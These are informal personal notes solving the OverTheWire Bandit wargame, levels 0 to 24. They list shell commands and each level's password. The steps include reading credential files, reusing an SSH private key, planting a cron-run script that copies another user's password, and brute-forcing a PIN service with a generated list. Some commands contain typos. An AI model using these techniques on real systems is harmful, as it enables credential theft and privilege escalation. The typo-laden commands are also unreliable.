#level0 -> level1
using ssh to login : ssh bandit0@bandit.labs.overthewire.org -p 2220
cat readme --> boJ9jbbUNNfktd78OOpsqOltutMc3MY1
#level1 -> level2
cat ./- --> CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
#level2 -> level3
cat ./spaces\ in\ this\ filename --> UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
#level3 -> level4
cd inhere/  ls -a   cat ./.hidden --> pIwrPrtPN36QITSp3EQaw936yaFoFgAB
#levle4 -> level5
files are not human-readables 
need conversion
hexdump -C inhere/* -file07 seems psw --> koReBOKuIDDepwhWk7jZC0RTdopnAYKh
#level5 -> level6
find -readable -not -executable -size 1033c --> DXjZPULLxYr17uwoI01bNLQbtFemEgo7
btw:
    b – 512-byte blocks (this is the default if no suffix is used)
    c – bytes
    w – two-byte words
    k – Kilobytes
    M – Megabytes
    G – Gigabytes
#level6 -> level7
home was clear so go up to the root cd /
now can find sg w this:  find . -group bandit6 -user bandit7 -size 33c --> ./var/lib/dpkg/info/bandit7.password --> HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
#level7 -> level8
find . -name "data.txt" 
vi ./data.txt ---> command mode use /millionth ---> cvX2JJa4CFALtqS87jk27qwqGhBM9plV
#level8 -> level9
cat data.txt | sort | uniq -u --> UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
#level9 -> level10
xxd data.txt | grep -n "=="| cut -d : -f 1 | tail -1
xxd data.txt | sed '1013,1015!d' --> truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
#lvl10
base64 -d data.txt --> IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
#lvl11
cat data.txt | tr '[A-Z]' '[N-ZA-O]' | tr '[a-z]' '[n-za-o]' --> 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
#lvl12
use file, mv and compression (tar/gzip/bzip2) commads
until get the ASCII text file data8 ---> 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
#lvl13
wsl: chmod don't work on the mount
scp -P 2220 bandit13@bandit.labs.overthewire.org:/home/bandit13/sshkey.private .
chmod 600 sshkey.private
ssh -i /tmp/pem_key.pem bandit14@bandit.labs.overthewire.org -p 2220
cat /etc/bandit_pass/bandit14 --> 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
#lvl14
bandit14@bandit:~$ nc localhost 30000 and send bandit14 passwd ---> BfMYroe26WYalil77FoDi9qh59eK5xNr
#lvl15
bandit15@bandit:~$ openssl s_client -connect localhost:30001 and send bandit15 passwd---> cluFn7wTiGryunymYOu4RcffSxQluehd
#lvl16
nc -zvn 127.0.0.1 31000-32000
get bandit17's private key and use it to ssh
cat /etc/bandit_pass/bandit17 --> xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
#lvl17
bandit17@bandit:~$ cat passwords.old | diff passwords.new - ---> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
#lvl18 
ssh bandit18@bandit.labs.overthewire.org -p 2220 /bin/bash #command after the ssh executes before the fw takes me out
cat readme ---> IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
#lvl19
./bandit20-do cat /etc/bandit_pass/bandit20 ---> GbKksEFF4yrVs6il55v6gwY5aVje5f0j
#lvl20 two terminal is needed!
T1: nc -lp 4000
T2: ./suconnect 4000
T1: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
---> gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
#lvl21 read files step-by-step
cat /etc/cron.d/cronjob_bandit22 
cat /usr/bin/cronjob_bandit22.sh  
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
---> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
#lvl22 understand how the mytarget variable created
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349 ---> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
#lvl23 don't forget give execution rights! blocked ls is very annoying
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/getpwd
chmod 777 getpwd
echo '#!/bin/bash' > getpwd.sh
echo 'cat etc/bandit_pass/bandir24 > /tmp/getpwd/pwd24.txt' >> getpwd.sh
cp getpwd.sh /var/spool/bandit24
cat pwd24.txt ---> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
#lvl24
mkdir /tmp/brute 
vi brute.py
    from itertools import product
    lst = ['0','1','2','3', '4', '5', '6', '7', '8', '9']
    lst = ["".join(item) for item in product(lst, repeat=4)]
    with open("PINs.txt", 'a') as f:
    for i in lst:
        f.write('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + i + '\n')
netcat localhost 30002 < PINs.txt ---> uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
#lvl25